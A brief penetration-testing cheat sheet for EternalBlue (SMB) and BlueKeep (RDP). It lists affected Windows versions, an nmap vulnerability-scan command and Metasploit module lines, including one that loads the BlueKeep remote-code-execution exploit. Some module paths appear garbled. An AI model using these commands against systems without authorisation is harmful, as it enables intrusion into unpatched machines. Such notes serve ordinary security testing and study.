## EternalBlue
smb - 2017 - Windows server 2008 R2 - buffer overflow
```bash
sudo nmap -sV -p445 --script=smb-vuln-ms17-010 $target
```
## BlueKeep
rdp - 2019 - XP, vista, windows 7, server 2008 R2
```
use auxiliary/scanner/cve___bluekeep
use exploit/windows/rdp/cve_2019___bluekeep_rce
```